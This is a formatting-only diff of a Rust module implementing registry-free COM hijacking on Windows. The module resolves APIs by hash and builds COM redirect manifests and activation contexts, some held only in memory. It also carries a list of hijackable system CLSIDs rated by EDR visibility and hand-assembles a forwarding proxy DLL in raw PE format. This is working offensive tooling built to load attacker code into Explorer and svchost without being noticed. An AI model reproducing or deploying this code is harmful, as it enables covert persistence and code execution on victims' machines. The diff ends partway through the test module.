@@ -41,19 +41,19 @@ use std::os::windows::ffi::OsStrExt;
 use std::ptr;
 
 use anyhow::{anyhow, bail, Context, Result};
-use tracing::{debug, info, warn};
 use serde::{Deserialize, Serialize};
+use tracing::{debug, info, warn};
 
-use crate::win_types::{GUID, REFIID};
-use crate::win_types::{BOOL, DWORD, FALSE, HMODULE, LPVOID, TRUE};
-use crate::win_types::{HANDLE, HRESULT, LPCWSTR, LPWSTR, NTSTATUS, PCWSTR, PVOID};
-use crate::win_types::S_OK;
-use crate::win_types::{SIZE_T, ULONG_PTR};
-use crate::win_types::LPCVOID;
-use windows_sys::Win32::Security::ACCESS_MASK;
-use windows_sys::Win32::System::Memory::SECTION_ALL_ACCESS;
 use crate::win_types::HANDLE as NT_HANDLE;
 use crate::win_types::LARGE_INTEGER;
+use crate::win_types::LPCVOID;
+use crate::win_types::S_OK;
+use crate::win_types::{BOOL, DWORD, FALSE, HMODULE, LPVOID, TRUE};
+use crate::win_types::{GUID, REFIID};
+use crate::win_types::{HANDLE, HRESULT, LPCWSTR, LPWSTR, NTSTATUS, PCWSTR, PVOID};
+use crate::win_types::{SIZE_T, ULONG_PTR};
+use windows_sys::Win32::Security::ACCESS_MASK;
+use windows_sys::Win32::System::Memory::SECTION_ALL_ACCESS;
 
 /// `SECTION_INHERIT` from ntapi — not available in winapi 0.3.
 type SECTION_INHERIT = DWORD;
@@ -64,8 +64,8 @@ use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // kernel32.dll — activation context API and file mapping
 const KERNEL32_DLL_W: &[u16] = &[
-    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
-    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
 ];
 const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);
 
@@ -83,8 +83,8 @@ const FN_GET_TEMP_PATH_W: u32 = hash_str_const(b"GetTempPathW");
 
 // ntdll.dll — for in-memory manifest via section creation
 const NTDLL_DLL_W: &[u16] = &[
-    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16,
-    'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
 ];
 const HASH_NTDLL_DLL: u32 = hash_wstr_const(NTDLL_DLL_W);
 
@@ -95,8 +95,8 @@ const FN_NT_CLOSE: u32 = hash_str_const(b"NtClose");
 
 // ole32.dll — COM activation
 const OLE32_DLL_W: &[u16] = &[
-    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16,
-    'd' as u16, 'l' as u16, 'l' as u16, 0,
+    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
 ];
 const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_DLL_W);
 
@@ -187,14 +187,11 @@ type FnActivateActCtx = unsafe extern "system" fn(HACTCTX, *mut ULONG_PTR) -> BO
 type FnDeactivateActCtx = unsafe extern "system" fn(DWORD, ULONG_PTR) -> BOOL;
 type FnReleaseActCtx = unsafe extern "system" fn(HACTCTX) -> ();
 
-type FnCreateFileW = unsafe extern "system" fn(
-    LPCWSTR, DWORD, DWORD, *mut c_void, DWORD, DWORD, HANDLE,
-) -> HANDLE;
+type FnCreateFileW =
+    unsafe extern "system" fn(LPCWSTR, DWORD, DWORD, *mut c_void, DWORD, DWORD, HANDLE) -> HANDLE;
 type FnCreateFileMappingW =
     unsafe extern "system" fn(HANDLE, *mut c_void, DWORD, DWORD, SIZE_T, LPCWSTR) -> HANDLE;
-type FnMapViewOfFile = unsafe extern "system" fn(
-    HANDLE, DWORD, DWORD, DWORD, SIZE_T,
-) -> LPVOID;
+type FnMapViewOfFile = unsafe extern "system" fn(HANDLE, DWORD, DWORD, DWORD, SIZE_T) -> LPVOID;
 type FnUnmapViewOfFile = unsafe extern "system" fn(LPCVOID) -> BOOL;
 type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> BOOL;
 type FnGetCurrentDirectoryW = unsafe extern "system" fn(DWORD, LPWSTR) -> DWORD;
@@ -203,39 +200,36 @@ type FnGetTempPathW = unsafe extern "system" fn(DWORD, LPWSTR) -> DWORD;
 type FnNtCreateSection = unsafe extern "system" fn(
     *mut NT_HANDLE,
     ACCESS_MASK,
-    *mut c_void,       // OBJECT_ATTRIBUTES (optional)
+    *mut c_void,        // OBJECT_ATTRIBUTES (optional)
     *mut LARGE_INTEGER, // MaximumSize (optional)
     DWORD,              // SectionPageProtection
     DWORD,              // AllocationAttributes
     HANDLE,             // FileHandle (optional)
 ) -> NTSTATUS;
 type FnNtMapViewOfSection = unsafe extern "system" fn(
-    NT_HANDLE,         // SectionHandle
-    HANDLE,            // ProcessHandle
-    *mut LPVOID,       // BaseAddress
-    ULONG_PTR,         // ZeroBits
-    SIZE_T,            // CommitSize
+    NT_HANDLE,          // SectionHandle
+    HANDLE,             // ProcessHandle
+    *mut LPVOID,        // BaseAddress
+    ULONG_PTR,          // ZeroBits
+    SIZE_T,             // CommitSize
     *mut LARGE_INTEGER, // SectionOffset (optional)
-    *mut SIZE_T,       // ViewSize
-    SECTION_INHERIT,   // InheritDisposition
-    DWORD,             // AllocationType
-    DWORD,             // Win32Protect
+    *mut SIZE_T,        // ViewSize
+    SECTION_INHERIT,    // InheritDisposition
+    DWORD,              // AllocationType
+    DWORD,              // Win32Protect
 ) -> NTSTATUS;
-type FnNtUnmapViewOfSection =
-    unsafe extern "system" fn(HANDLE, LPVOID) -> NTSTATUS;
+type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, LPVOID) -> NTSTATUS;
 type FnNtClose = unsafe extern "system" fn(HANDLE) -> NTSTATUS;
 
-type FnCoGetClassObject = unsafe extern "system" fn(
-    REFIID, DWORD, *mut c_void, REFIID, *mut LPVOID,
-) -> HRESULT;
-type FnCoCreateInstance = unsafe extern "system" fn(
-    REFIID, *mut c_void, DWORD, REFIID, *mut LPVOID,
-) -> HRESULT;
+type FnCoGetClassObject =
+    unsafe extern "system" fn(REFIID, DWORD, *mut c_void, REFIID, *mut LPVOID) -> HRESULT;
+type FnCoCreateInstance =
+    unsafe extern "system" fn(REFIID, *mut c_void, DWORD, REFIID, *mut LPVOID) -> HRESULT;
 
 /// Type alias for `LPCVOID` (pointer to const void).
-// LPCVOID imported above from 
+// LPCVOID imported above from
 
-// ULONG_PTR imported above from 
+// ULONG_PTR imported above from
 
 // ── Data structures ─────────────────────────────────────────────────────────
 
@@ -363,20 +357,33 @@ impl ManifestBuilder {
     ) -> Result<String> {
         // Validate CLSID format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
         if !clsid.starts_with('{') || !clsid.ends_with('}') {
-            bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}", clsid);
+            bail!(
+                "CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}",
+                clsid
+            );
         }
-        let inner = &clsid[1..clsid.len()-1];
+        let inner = &clsid[1..clsid.len() - 1];
         let parts: Vec<&str> = inner.split('-').collect();
         if parts.len() != 5 {
             bail!("CLSID must have 5 dash-separated groups, got: {}", clsid);
         }
         for (i, part) in parts.iter().enumerate() {
             let expected_len = match i {
-                0 => 8, 1 => 4, 2 => 4, 3 => 4, 4 => 12, _ => unreachable!(),
+                0 => 8,
+                1 => 4,
+                2 => 4,
+                3 => 4,
+                4 => 12,
+                _ => unreachable!(),
             };
             if part.len() != expected_len {
-                bail!("CLSID group {} has wrong length (expected {}, got {}): {}",
-                       i, expected_len, part.len(), clsid);
+                bail!(
+                    "CLSID group {} has wrong length (expected {}, got {}): {}",
+                    i,
+                    expected_len,
+                    part.len(),
+                    clsid
+                );
             }
             if !part.chars().all(|c| c.is_ascii_hexdigit()) {
                 bail!("CLSID contains non-hex characters: {}", clsid);
@@ -428,7 +435,10 @@ impl ManifestBuilder {
     pub fn build_memory_only_manifest(clsid: &str, prog_id: Option<&str>) -> Result<String> {
         // Validate CLSID format
         if !clsid.starts_with('{') || !clsid.ends_with('}') {
-            bail!("CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}", clsid);
+            bail!(
+                "CLSID must be in {{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}} format, got: {}",
+                clsid
+            );
         }
 
         let prog_id_attr = match prog_id {
@@ -459,10 +469,10 @@ impl ManifestBuilder {
 /// Escape special XML characters in a string.
 fn xml_escape(s: &str) -> String {
     s.replace('&', "&amp;")
-     .replace('<', "&lt;")
-     .replace('>', "&gt;")
-     .replace('"', "&quot;")
-     .replace('\'', "&apos;")
+        .replace('<', "&lt;")
+        .replace('>', "&gt;")
+        .replace('"', "&quot;")
+        .replace('\'', "&apos;")
 }
 
 // ── ActivationContext ────────────────────────────────────────────────────────
@@ -534,7 +544,10 @@ impl ActivationContext {
             bail!("CreateActCtxW failed for manifest: {}", manifest_path);
         }
 
-        debug!("Created activation context handle={:?} for manifest: {}", handle, manifest_path);
+        debug!(
+            "Created activation context handle={:?} for manifest: {}",
+            handle, manifest_path
+        );
 
         Ok(ActivationContext {
             handle,
@@ -630,19 +643,24 @@ impl ActivationContext {
 
         // Generate a pseudo-random temp filename
         let mut rand_bytes = [0u8; 8];
-        getrandom::getrandom(&mut rand_bytes)
-            .map_err(|e| anyhow!("getrandom failed: {}", e))?;
-        let temp_name = format!("{}{:02x}{:02x}{:02x}{:02x}.manifest",
+        getrandom::getrandom(&mut rand_bytes).map_err(|e| anyhow!("getrandom failed: {}", e))?;
+        let temp_name = format!(
+            "{}{:02x}{:02x}{:02x}{:02x}.manifest",
             hex::encode(&rand_bytes[0..4]),
-            rand_bytes[4], rand_bytes[5], rand_bytes[6], rand_bytes[7]);
+            rand_bytes[4],
+            rand_bytes[5],
+            rand_bytes[6],
+            rand_bytes[7]
+        );
 
         // Build full temp path
         let temp_path_wide: Vec<u16> = temp_path_buf[..temp_len as usize].to_vec();
         let temp_name_wide = to_wide_null(&temp_name);
         let full_temp_path: Vec<u16> = [
-            &temp_path_wide[..temp_path_wide.len()-1], // strip null
+            &temp_path_wide[..temp_path_wide.len() - 1], // strip null
             &temp_name_wide,
-        ].concat();
+        ]
+        .concat();
 
         // Write manifest to temp file
         let file_handle = create_file_w(
@@ -798,7 +816,10 @@ impl ActivationContext {
         if result != TRUE {
             warn!("DeactivateActCtx failed for cookie={}", self.cookie);
         } else {
-            debug!("Deactivated activation context for CLSID: {}", self.target_clsid);
+            debug!(
+                "Deactivated activation context for CLSID: {}",
+                self.target_clsid
+            );
         }
 
         self.active = false;
@@ -812,9 +833,8 @@ impl ActivationContext {
         let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
             .ok_or_else(|| anyhow!("kernel32.dll not found"))?;
 
-        type FnWriteFile = unsafe extern "system" fn(
-            HANDLE, LPCVOID, DWORD, *mut DWORD, *mut c_void,
-        ) -> BOOL;
+        type FnWriteFile =
+            unsafe extern "system" fn(HANDLE, LPCVOID, DWORD, *mut DWORD, *mut c_void) -> BOOL;
 
         let write_file: FnWriteFile = unsafe {
             mem::transmute(
@@ -832,7 +852,11 @@ impl ActivationContext {
             ptr::null_mut(),
         );
         if result != TRUE || bytes_written as usize != data.len() {
-            bail!("WriteFile failed: wrote {} of {} bytes", bytes_written, data.len());
+            bail!(
+                "WriteFile failed: wrote {} of {} bytes",
+                bytes_written,
+                data.len()
+            );
         }
         Ok(())
     }
@@ -914,26 +938,66 @@ impl TargetSelector {
     /// 4. They are not critical system components that would crash if hijacked
     const KNOWN_TARGETS: &[(&str, &str, &str, &str)] = &[
         // (CLSID, ProgID, Description, EDR visibility)
-        ("{4991D34B-80A1-4291-83B6-3328366B9097}", "SearchFolder",
-         "Windows Search Folder — loaded by Explorer", "Low"),
-        ("{9DBD2C50-62AD-11D0-B806-00C04FD706EC}", "ThumbnailHandler",
-         "Shell thumbnail handler — loaded by Explorer", "Low"),
-        ("{BCDE0395-E52F-467C-8E3D-C4579291692E}", "",
-         "MMDevice API — audio device enumeration", "Medium"),
-        ("{E2B5A2A6-1A4D-453E-9B74-7B5A1E3F49B6}", "",
-         "Task Scheduler COM handler — loaded by svchost", "Medium"),
-        ("{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}", "",
-         "Background Intelligent Transfer Service (BITS)", "High"),
-        ("{CD6C7868-5864-11D0-ABF0-0020AF6B0B7A}", "",
-         "Task Scheduler — scheduled task creation", "Medium"),
-        ("{0002CE02-0000-0000-C000-000000000046}", "",
-         "Microsoft Update Engine — loaded by wusa.exe", "Medium"),
-        ("{00000535-0000-0010-8000-00AA006D2EA4}", "ADODB.Connection",
-         "ADODB Connection — loaded by many applications", "Low"),
-        ("{0A89A860-D7B1-11CE-8350-444553540000}", "",
-         "Shell autocomplete — loaded by Explorer", "Low"),
-        ("{77A26672-8D2F-47F5-A2F3-0B27B66DF429}", "",
-         "IE/Edge COM helper — loaded by browser", "Low"),
+        (
+            "{4991D34B-80A1-4291-83B6-3328366B9097}",
+            "SearchFolder",
+            "Windows Search Folder — loaded by Explorer",
+            "Low",
+        ),
+        (
+            "{9DBD2C50-62AD-11D0-B806-00C04FD706EC}",
+            "ThumbnailHandler",
+            "Shell thumbnail handler — loaded by Explorer",
+            "Low",
+        ),
+        (
+            "{BCDE0395-E52F-467C-8E3D-C4579291692E}",
+            "",
+            "MMDevice API — audio device enumeration",
+            "Medium",
+        ),
+        (
+            "{E2B5A2A6-1A4D-453E-9B74-7B5A1E3F49B6}",
+            "",
+            "Task Scheduler COM handler — loaded by svchost",
+            "Medium",
+        ),
+        (
+            "{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}",
+            "",
+            "Background Intelligent Transfer Service (BITS)",
+            "High",
+        ),
+        (
+            "{CD6C7868-5864-11D0-ABF0-0020AF6B0B7A}",
+            "",
+            "Task Scheduler — scheduled task creation",
+            "Medium",
+        ),
+        (
+            "{0002CE02-0000-0000-C000-000000000046}",
+            "",
+            "Microsoft Update Engine — loaded by wusa.exe",
+            "Medium",
+        ),
+        (
+            "{00000535-0000-0010-8000-00AA006D2EA4}",
+            "ADODB.Connection",
+            "ADODB Connection — loaded by many applications",
+            "Low",
+        ),
+        (
+            "{0A89A860-D7B1-11CE-8350-444553540000}",
+            "",
+            "Shell autocomplete — loaded by Explorer",
+            "Low",
+        ),
+        (
+            "{77A26672-8D2F-47F5-A2F3-0B27B66DF429}",
+            "",
+            "IE/Edge COM helper — loaded by browser",
+            "Low",
+        ),
     ];
 
     /// Find hijackable COM targets from the known targets list.
@@ -1010,7 +1074,11 @@ pub fn generate_proxy_dll_template(clsid: &str, original_handler: &str) -> Resul
     }
 
     let dll_bytes = build_minimal_proxy_dll(clsid, original_handler)?;
-    info!("Generated forwarding proxy DLL: {} bytes for CLSID {}", dll_bytes.len(), clsid);
+    info!(
+        "Generated forwarding proxy DLL: {} bytes for CLSID {}",
+        dll_bytes.len(),
+        clsid
+    );
     Ok(dll_bytes)
 }
 
@@ -1058,15 +1126,16 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
             || original_handler
                 .to_ascii_lowercase()
                 .contains("\\syswow64\\")
-            || original_handler
-                .to_ascii_lowercase()
-                .contains("\\system\\");
-        let needs_warning = !is_system_dir
-            && (original_handler.contains('\\') || original_handler.contains('/'));
+            || original_handler.to_ascii_lowercase().contains("\\system\\");
+        let needs_warning =
+            !is_system_dir && (original_handler.contains('\\') || original_handler.contains('/'));
         (stem, needs_warning)
     };
     if module_name.is_empty() {
-        bail!("Cannot derive forwarder module name from '{}'", original_handler);
+        bail!(
+            "Cannot derive forwarder module name from '{}'",
+            original_handler
+        );
     }
     if module_path_prefix {
         tracing::warn!(
@@ -1115,10 +1184,10 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
     //    VA 0x1000  .text   (6-byte DllMain: mov eax,1; ret)
     //    VA 0x2000  .rdata  (export directory with forwarder-RVA EAT entries)
 
-    const TEXT_VA: u32    = 0x1000;
-    const TEXT_FILE: u32  = 0x200;
+    const TEXT_VA: u32 = 0x1000;
+    const TEXT_FILE: u32 = 0x200;
     const TEXT_RAWSIZE: u32 = 0x200;
-    const RDATA_VA: u32   = 0x2000;
+    const RDATA_VA: u32 = 0x2000;
     const RDATA_FILE: u32 = 0x400;
 
     // ── Compute .rdata offsets ────────────────────────────────────────────
@@ -1131,20 +1200,30 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
     //  export_name_off[i]:  "FunctionName\0" for each export
     //  fwd_off[i]:          "module.FunctionName\0" forwarder strings
 
-    let eat_off: usize  = 40;
-    let enpt_off: usize = eat_off  + 4 * n;
-    let eot_off: usize  = enpt_off + 4 * n;
-    let eot_end: usize  = eot_off  + 2 * n;
+    let eat_off: usize = 40;
+    let enpt_off: usize = eat_off + 4 * n;
+    let eot_off: usize = enpt_off + 4 * n;
+    let eot_end: usize = eot_off + 2 * n;
     let dll_name_off: usize = (eot_end + 3) & !3; // align to 4 bytes
     let dll_name_bytes = b"proxy.dll\0";
 
     let mut cur = dll_name_off + dll_name_bytes.len();
-    let export_name_offsets: Vec<usize> = export_name_strings.iter().map(|s| {
-        let off = cur; cur += s.len(); off
-    }).collect();
-    let forwarder_offsets: Vec<usize> = forwarder_strings.iter().map(|s| {
-        let off = cur; cur += s.len(); off
-    }).collect();
+    let export_name_offsets: Vec<usize> = export_name_strings
+        .iter()
+        .map(|s| {
+            let off = cur;
+            cur += s.len();
+            off
+        })
+        .collect();
+    let forwarder_offsets: Vec<usize> = forwarder_strings
+        .iter()
+        .map(|s| {
+            let off = cur;
+            cur += s.len();
+            off
+        })
+        .collect();
 
     let rdata_content_size = cur;
     // Round up to FileAlignment
@@ -1165,16 +1244,16 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
     let rdata_rva = |off: usize| RDATA_VA + off as u32;
 
     // Export Directory (40 bytes at offset 0)
-    patch_u32(&mut rdata,  0, 0);                         // Characteristics
-    patch_u32(&mut rdata,  4, 0);                         // TimeDateStamp
-    // bytes 8-11: MajorVersion / MinorVersion — already 0
-    patch_u32(&mut rdata, 12, rdata_rva(dll_name_off));   // Name RVA
-    patch_u32(&mut rdata, 16, 1);                         // OrdinalBase
-    patch_u32(&mut rdata, 20, n as u32);                  // NumberOfFunctions
-    patch_u32(&mut rdata, 24, n as u32);                  // NumberOfNames
-    patch_u32(&mut rdata, 28, rdata_rva(eat_off));        // AddressOfFunctions (EAT)
-    patch_u32(&mut rdata, 32, rdata_rva(enpt_off));       // AddressOfNames (ENPT)
-    patch_u32(&mut rdata, 36, rdata_rva(eot_off));        // AddressOfNameOrdinals (EOT)
+    patch_u32(&mut rdata, 0, 0); // Characteristics
+    patch_u32(&mut rdata, 4, 0); // TimeDateStamp
+                                 // bytes 8-11: MajorVersion / MinorVersion — already 0
+    patch_u32(&mut rdata, 12, rdata_rva(dll_name_off)); // Name RVA
+    patch_u32(&mut rdata, 16, 1); // OrdinalBase
+    patch_u32(&mut rdata, 20, n as u32); // NumberOfFunctions
+    patch_u32(&mut rdata, 24, n as u32); // NumberOfNames
+    patch_u32(&mut rdata, 28, rdata_rva(eat_off)); // AddressOfFunctions (EAT)
+    patch_u32(&mut rdata, 32, rdata_rva(enpt_off)); // AddressOfNames (ENPT)
+    patch_u32(&mut rdata, 36, rdata_rva(eot_off)); // AddressOfNameOrdinals (EOT)
 
     // EAT: forwarder-string RVAs (within .rdata, which is within the export
     // directory's reported range → loader treats them as PE forwarders)
@@ -1189,13 +1268,12 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
 
     // EOT: 0-based ordinal indices
     for i in 0..n {
-        rdata[eot_off + 2 * i]     = i as u8;
+        rdata[eot_off + 2 * i] = i as u8;
         rdata[eot_off + 2 * i + 1] = 0;
     }
 
     // DLL name string
-    rdata[dll_name_off..dll_name_off + dll_name_bytes.len()]
-        .copy_from_slice(dll_name_bytes);
+    rdata[dll_name_off..dll_name_off + dll_name_bytes.len()].copy_from_slice(dll_name_bytes);
 
     // Export name strings ("FunctionName\0")
     for (i, s) in export_name_strings.iter().enumerate() {
@@ -1225,42 +1303,43 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
 
     // COFF Header (20 bytes)
     pe.extend_from_slice(&0x8664u16.to_le_bytes()); // Machine: AMD64
-    pe.extend_from_slice(&2u16.to_le_bytes());      // NumberOfSections (2)
-    pe.extend_from_slice(&0u32.to_le_bytes());      // TimeDateStamp
-    pe.extend_from_slice(&0u32.to_le_bytes());      // PointerToSymbolTable
-    pe.extend_from_slice(&0u32.to_le_bytes());      // NumberOfSymbols
+    pe.extend_from_slice(&2u16.to_le_bytes()); // NumberOfSections (2)
+    pe.extend_from_slice(&0u32.to_le_bytes()); // TimeDateStamp
+    pe.extend_from_slice(&0u32.to_le_bytes()); // PointerToSymbolTable
+    pe.extend_from_slice(&0u32.to_le_bytes()); // NumberOfSymbols
     pe.extend_from_slice(&0x00F0u16.to_le_bytes()); // SizeOfOptionalHeader
     pe.extend_from_slice(&0x2102u16.to_le_bytes()); // DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
 
     // Optional Header PE32+ (240 bytes)
     pe.extend_from_slice(&0x020Bu16.to_le_bytes()); // Magic PE32+
-    pe.push(0x0E); pe.push(0x00);                  // LinkerVersion 14.0
-    pe.extend_from_slice(&TEXT_RAWSIZE.to_le_bytes());         // SizeOfCode
+    pe.push(0x0E);
+    pe.push(0x00); // LinkerVersion 14.0
+    pe.extend_from_slice(&TEXT_RAWSIZE.to_le_bytes()); // SizeOfCode
     pe.extend_from_slice(&(rdata_raw_size as u32).to_le_bytes()); // SizeOfInitializedData
-    pe.extend_from_slice(&0u32.to_le_bytes());      // SizeOfUninitializedData
-    pe.extend_from_slice(&TEXT_VA.to_le_bytes());   // AddressOfEntryPoint (DllMain)
-    pe.extend_from_slice(&TEXT_VA.to_le_bytes());   // BaseOfCode
+    pe.extend_from_slice(&0u32.to_le_bytes()); // SizeOfUninitializedData
+    pe.extend_from_slice(&TEXT_VA.to_le_bytes()); // AddressOfEntryPoint (DllMain)
+    pe.extend_from_slice(&TEXT_VA.to_le_bytes()); // BaseOfCode
     pe.extend_from_slice(&0x180000000u64.to_le_bytes()); // ImageBase
     pe.extend_from_slice(&0x1000u32.to_le_bytes()); // SectionAlignment
     pe.extend_from_slice(&0x0200u32.to_le_bytes()); // FileAlignment
-    pe.extend_from_slice(&6u16.to_le_bytes());      // MajorOSVersion
-    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorOSVersion
-    pe.extend_from_slice(&0u16.to_le_bytes());      // MajorImageVersion
-    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorImageVersion
-    pe.extend_from_slice(&6u16.to_le_bytes());      // MajorSubsystemVersion
-    pe.extend_from_slice(&0u16.to_le_bytes());      // MinorSubsystemVersion
-    pe.extend_from_slice(&0u32.to_le_bytes());      // Win32VersionValue
+    pe.extend_from_slice(&6u16.to_le_bytes()); // MajorOSVersion
+    pe.extend_from_slice(&0u16.to_le_bytes()); // MinorOSVersion
+    pe.extend_from_slice(&0u16.to_le_bytes()); // MajorImageVersion
+    pe.extend_from_slice(&0u16.to_le_bytes()); // MinorImageVersion
+    pe.extend_from_slice(&6u16.to_le_bytes()); // MajorSubsystemVersion
+    pe.extend_from_slice(&0u16.to_le_bytes()); // MinorSubsystemVersion
+    pe.extend_from_slice(&0u32.to_le_bytes()); // Win32VersionValue
     pe.extend_from_slice(&size_of_image.to_le_bytes()); // SizeOfImage
     pe.extend_from_slice(&0x0200u32.to_le_bytes()); // SizeOfHeaders
-    pe.extend_from_slice(&0u32.to_le_bytes());      // CheckSum
-    pe.extend_from_slice(&3u16.to_le_bytes());      // Subsystem: WINDOWS_CUI
+    pe.extend_from_slice(&0u32.to_le_bytes()); // CheckSum
+    pe.extend_from_slice(&3u16.to_le_bytes()); // Subsystem: WINDOWS_CUI
     pe.extend_from_slice(&0x8160u16.to_le_bytes()); // DllCharacteristics: DYNAMIC_BASE|NX_COMPAT|TERMINAL_SERVER_AWARE|HIGH_ENTROPY_VA
     pe.extend_from_slice(&0x100000u64.to_le_bytes()); // SizeOfStackReserve
     pe.extend_from_slice(&0x001000u64.to_le_bytes()); // SizeOfStackCommit
     pe.extend_from_slice(&0x100000u64.to_le_bytes()); // SizeOfHeapReserve
     pe.extend_from_slice(&0x001000u64.to_le_bytes()); // SizeOfHeapCommit
-    pe.extend_from_slice(&0u32.to_le_bytes());      // LoaderFlags
-    pe.extend_from_slice(&16u32.to_le_bytes());     // NumberOfRvaAndSizes
+    pe.extend_from_slice(&0u32.to_le_bytes()); // LoaderFlags
+    pe.extend_from_slice(&16u32.to_le_bytes()); // NumberOfRvaAndSizes
 
     // Data directories (16 × 8 bytes).
     // [0] Export table: spans all of .rdata so forwarder strings are covered.
@@ -1273,12 +1352,12 @@ fn build_minimal_proxy_dll(_clsid: &str, original_handler: &str) -> Result<Vec<u
 
     // Section header: .text (40 bytes)
     pe.extend_from_slice(b".text\0\0\0");
-    pe.extend_from_slice(&6u32.to_le_bytes());          // VirtualSize (DllMain stub)
+    pe.extend_from_slice(&6u32.to_le_bytes()); // VirtualSize (DllMain stub)
     pe.extend_from_slice(&TEXT_VA.to_le_bytes());
     pe.extend_from_slice(&TEXT_RAWSIZE.to_le_bytes());
     pe.extend_from_slice(&TEXT_FILE.to_le_bytes());
-    pe.extend_from_slice(&0u32.to_le_bytes());          // PointerToRelocations
-    pe.extend_from_slice(&0u32.to_le_bytes());          // PointerToLinenumbers
+    pe.extend_from_slice(&0u32.to_le_bytes()); // PointerToRelocations
+    pe.extend_from_slice(&0u32.to_le_bytes()); // PointerToLinenumbers
     pe.extend_from_slice(&0u16.to_le_bytes());
     pe.extend_from_slice(&0u16.to_le_bytes());
     pe.extend_from_slice(&0x60000020u32.to_le_bytes()); // CODE | EXECUTE | READ
@@ -1343,7 +1422,11 @@ fn to_wide_null(s: &str) -> Vec<u16> {
 /// # Returns
 ///
 /// JSON result with the manifest XML and metadata.
-pub fn generate_manifest(clsid: &str, proxy_dll_path: &str, prog_id: Option<&str>) -> Result<ManifestResult> {
+pub fn generate_manifest(
+    clsid: &str,
+    proxy_dll_path: &str,
+    prog_id: Option<&str>,
+) -> Result<ManifestResult> {
     let manifest_xml = ManifestBuilder::build_com_redirect_manifest(clsid, proxy_dll_path, prog_id)
         .context("Failed to build COM redirect manifest")?;
 
@@ -1384,7 +1467,10 @@ pub fn activate_from_file(manifest_path: &str, clsid: &str) -> Result<Activation
 
     Ok(ActivationContextResult {
         success: true,
-        message: format!("Activation context created and activated for CLSID {}", clsid),
+        message: format!(
+            "Activation context created and activated for CLSID {}",
+            clsid
+        ),
         target_clsid: clsid.to_string(),
         in_memory: false,
     })
@@ -1413,7 +1499,10 @@ pub fn activate_from_memory(manifest_xml: &str, clsid: &str) -> Result<Activatio
 
     Ok(ActivationContextResult {
         success: true,
-        message: format!("In-memory activation context lifecycle completed for CLSID {}", clsid),
+        message: format!(
+            "In-memory activation context lifecycle completed for CLSID {}",
+            clsid
+        ),
         target_clsid: clsid.to_string(),
         in_memory: true,
     })
@@ -1424,8 +1513,7 @@ pub fn activate_from_memory(manifest_xml: &str, clsid: &str) -> Result<Activatio
 /// Returns a list of COM CLSIDs that are suitable for registry-free hijacking,
 /// along with metadata about each target.
 pub fn scan_targets() -> Result<TargetScanResult> {
-    let targets = TargetSelector::find_target_clsid()
-        .context("Failed to scan COM targets")?;
+    let targets = TargetSelector::find_target_clsid().context("Failed to scan COM targets")?;
 
     let scanned = targets.len() as u32;
     let hijackable = targets.len() as u32;
@@ -1492,7 +1580,8 @@ mod tests {
             "{4991D34B-80A1-4291-83B6-3328366B9097}",
             "C:\\temp\\proxy.dll",
             Some("SearchFolder"),
-        ).unwrap();
+        )
+        .unwrap();
 
         // Verify XML structure
         assert!(xml.contains("<?xml version=\"1.0\""));
@@ -1514,7 +1603,8 @@ mod tests {
             "{4991D34B-80A1-4291-83B6-3328366B9097}",
             "proxy.dll",
             None,
-        ).unwrap();
+        )
+        .unwrap();
 
         assert!(!xml.contains("progid="));
         assert!(xml.contains("clsid=\"{4991D34B-80A1-4291-83B6-3328366B9097}\""));
@@ -1525,7 +1615,8 @@ mod tests {
         let xml = ManifestBuilder::build_memory_only_manifest(
             "{4991D34B-80A1-4291-83B6-3328366B9097}",
             Some("SearchFolder"),
-        ).unwrap();
+        )
+        .unwrap();
 
         assert!(xml.contains("<?xml version=\"1.0\""));
         assert!(xml.contains("comClass"));
@@ -1538,36 +1629,61 @@ mod tests {
     fn test_manifest_invalid_clsid() {
         // Missing braces
         assert!(ManifestBuilder::build_com_redirect_manifest(
-            "4991D34B-80A1-4291-83B6-3328366B9097", "proxy.dll", None,
-        ).is_err());
+            "4991D34B-80A1-4291-83B6-3328366B9097",
+            "proxy.dll",
+            None,
+        )
+        .is_err());
 
         // Wrong number of groups
         assert!(ManifestBuilder::build_com_redirect_manifest(
